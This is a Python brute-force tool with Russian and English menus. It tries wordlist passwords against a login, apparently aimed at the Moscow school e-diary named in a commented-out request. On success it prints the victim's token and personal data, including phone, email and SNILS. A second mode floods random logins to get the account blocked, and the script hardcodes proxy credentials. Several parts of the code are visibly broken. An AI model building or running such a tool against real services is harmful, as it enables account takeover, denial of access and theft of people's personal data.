import requests
import os
import json
import random
#from colorama import init, Fore, Back, Style
#init()
banner = """
:::'###::::'##::: ##:'########:'####::'######:::'######::'##::::'##:
::'## ##::: ###:: ##:... ##..::. ##::'##... ##:'##... ##: ##:::: ##:
:'##:. ##:: ####: ##:::: ##::::: ##:: ##:::..:: ##:::..:: ##:::: ##:
'##:::. ##: ## ## ##:::: ##::::: ##::. ######:: ##::::::: #########:
 #########: ##. ####:::: ##::::: ##:::..... ##: ##::::::: ##.... ##:
 ##.... ##: ##:. ###:::: ##::::: ##::'##::: ##: ##::: ##: ##:::: ##:
 ##:::: ##: ##::. ##:::: ##::::'####:. ######::. ######:: ##:::: ##:
..:::::..::..::::..:::::..:::::....:::......::::......:::..:::::..::

    created by @debian_lab && @mitchel_ed
"""


option = 0
version = 0
proxies = {
  'http': '8DYXbsjSKk:hdiviSOfmW@109.196.172.166:52999/'
}
def bruteforce(mode, login):
    if mode == "know login":
        clear()
        print(f"[+] Атака на {login} началась")
        passwords = open("./slovar.txt", "r", encoding="utf-8").readlines()
        for password in passwords:
            res = requests.post("https://jsonplaceholder.typicode.com/posts", json={
                "login": login,
                "password_plain": password
            })
            
            
            if res.status_code != 200:
                print("[-] Пароль " + password + " не подходит!\n")
                
            elif res.status_code == 200:
                print("[+] Пароль {password} подошел!")
                token = res.json().authentication_token
                date = res.json().date_of_birth
                first_name = res.json().first_name
                guid = res.json().guid
                email = res.json().email
                id = res.json().id
                last_name = res.json().last_name
                phone = res.json().phone_number
                sex = res.json().sex
                snils = res.json().snils 
                print("[+] Полученные данные:")
                print("Токен Авторизации: " + token)
                print("Имя: " + first_name + "  " + last_name)
                print("Пол: " + sex)
                print("Дата Рождения: " + date)
                print("Государственный ID: " + guid)
                print("Номер телефона: " + phone)
                print("Электронная почта: " + email)
                print("СНИЛС " + snils)
                break
    elif mode == "ddos":
        while True:
            instance = "abcdefghijklmnopqrstuvwxyz"
            password = ""
            for i in range(7):
                password + random.choice(instance)    
            
            res = requests.post("https://jsonplaceholder.typicode.com/posts", json={
                "login": login,
                "password_plain": password
            })
            print("[+] Запрос отправлен")
                          
def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(banner)

def menu():
    global option
    clear()
    if version == 1:
        menu = "\n\n1) Брутфорс атака\n2) Заблокировать аккаунт\n3) Инструкция\n\nВыберите опцию:"
    elif version == 2:
        menu = "\n\n1) Bruteforce attack\n2) Block account\n3) Help\n\nChoose Option:"
    else:
        menu()

    option = int(input(menu))
    option_check()
    
def language():
    global version
    clear()
    version = int(input("\n\n1) Russian version\n2) English version\n\nChoose Option:"))
    if version != 1 and version != 2:
        language()

def option_check():
    if option == 3:
        clear()
        if version == 1:
            print("\n\nВсе пароли требуется добавить в файл slovar.txt\nЕсли вы не знаете логин - то все логины на которые будет производится атака необходимо добавить в файл logins.txt\nЕсли вы знаете логин - этого делать не потебуется")
            input("Нажмите 'Enter' чтобы продолжить.....")
        elif version == 2:
            print("\n\nAll passwords must be added to the slovar.txt file\nIf you do not know the login, then all the logins that will be attacked must be added to the logins.txt file\nIf you know the login, there is no need to do this")
            input("Press 'Enter' to continue.....")

        clear()
        menu()
    elif option == 2:
        clear()
        login = input("Введите логин: ")
        try:
            bruteforce("ddos", login)
        except:
            print("Goodbye, friend!")
    elif option == 1:
        clear()
        login = input("Введите логин: ")
        try:
            bruteforce("know login", login)
        except:
            print("Goodbye, friend!")
        
clear()
language()
menu()

#res = requests.post("https://dnevnik.mos.ru/lms/api/sessions", json={
#    "login": "jusuf-zadeaf",
#    "password_plain": "jusuf-zadeaf"
#})

#print(res.json())